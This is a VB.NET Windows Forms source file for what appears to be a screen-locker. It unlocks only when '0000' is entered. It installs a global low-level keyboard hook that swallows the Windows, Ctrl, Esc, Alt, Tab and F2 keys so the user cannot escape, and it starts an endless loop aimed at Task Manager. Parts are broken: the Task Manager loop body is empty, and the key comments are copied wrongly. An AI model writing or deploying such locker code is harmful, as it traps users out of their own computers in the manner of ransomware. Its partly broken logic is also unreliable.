Option Strict On
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Reflection
Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "0000" Then
           Me.Hide()
            Done.Show()
 
        End If

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Thread As New Threading.Thread(AddressOf block)
            Thread.start()
    End Sub
    Sub block()
        While True 
            For Each Process As Process In Process.GetProcessesByName("TaskMgr")

            Next
        End While
    End Sub

    'Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProcDelegate, ByVal hMod As IntPtr, ByVal dwThreadId As Integer) As IntPtr
    'Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hHook As IntPtr) As Boolean
    'Declare Function CallNextHookEx Lib "user32" Alias "CallNextHookEx" (ByVal hHook As IntPtr, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    'Delegate Function LowLevelKeyboardProcDelegate(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    'Const WH_KEYBOARD_LL As Integer = 13
    'Structure KBDLLHOOKSTRUCT
    '    Dim vkCode As Integer
    '    Dim vkCode As Integer
    '    Dim flags As Integer
    '    Dim time As Integer
    '    Dim dwExtraInfo As Integer
    'End Structure
    'Dim intLLKey As IntPtr
    'Private Sub frmMain_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    '    intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, IntPtr.Zero, 0)
    'End Sub
    'Private Sub frmMain_Closing(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
    '    UnhookWindowsHookEx(intLLKey)
    'End Sub
    'Private Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    '    Dim blnEat As Boolean = False

    '    Select Case wParam
    '        Case 256, 257, 260, 261
    '            Alt+Tab, Alt + Esc, Ctrl + Esc, Windows Key    
    '                blnEat = ((lParam.vkCode = 9) AndAlso (lParam.flags = 32)) Or _
    '                ((lParam.vkCode = 27) AndAlso (lParam.flags = 32)) Or _
    '                ((lParam.vkCode = 27) AndAlso (lParam.flags = 0)) Or _
    '                ((lParam.vkCode = 91) AndAlso (lParam.flags = 1)) Or _
    '                ((lParam.vkCode = 92) AndAlso (lParam.flags = 1))
    '    End Select

    '    If blnEat = True Then
    '        Return 1
    '    Else
    '        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
    '    End If
    'End Function
     Private Structure KBDLLHOOKSTRUCT
 
        Public key As Keys
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure
 
    'System level functions to be used for hook and unhook keyboard input
   Private Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
 Private Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
 Private Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr
    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
 Private Shared Function GetModuleHandle(ByVal name As String) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto)> _
 Private Shared Function GetAsyncKeyState(ByVal key As Keys) As Short
    End Function
 
    'Declaring Global objects
   Private ptrHook As IntPtr
    Private objKeyboardProcess As LowLevelKeyboardProc
 
 
 
    Public Sub New()
     
        Try
            Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule
            'Get Current Module
           objKeyboardProcess = New LowLevelKeyboardProc(AddressOf captureKey)
            'Assign callback function each time keyboard process
           ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0)
            'Setting Hook of Keyboard Process for current module
           ' This call is required by the Windows Form Designer.
           InitializeComponent()
 
            ' Add any initialization after the InitializeComponent() call.
 
        Catch ex As Exception
 
        End Try
    End Sub
 
    Private Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr
     
        Try
            If nCode >= 0 Then
                Dim objKeyInfo As KBDLLHOOKSTRUCT = DirectCast(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)
                If objKeyInfo.key = Keys.RWin OrElse objKeyInfo.key = Keys.LWin Then
                    ' Disabling Windows keys
                   Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.ControlKey OrElse objKeyInfo.key = Keys.Escape Then
                    ' Disabling Ctrl + Esc keys
                   Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.ControlKey OrElse objKeyInfo.key = Keys.Down Then
                    ' Disabling Ctrl + Esc keys
                   Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.Alt OrElse objKeyInfo.key = Keys.Tab Then
                    ' Disabling Ctrl + Esc keys
                   Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.F2 Then
                    ' Disabling Ctrl + Esc keys
                   Return CType(1, IntPtr)
                End If
            End If
            Return CallNextHookEx(ptrHook, nCode, wp, lp)
        Catch ex As Exception
 
        End Try
    End Function
End Class
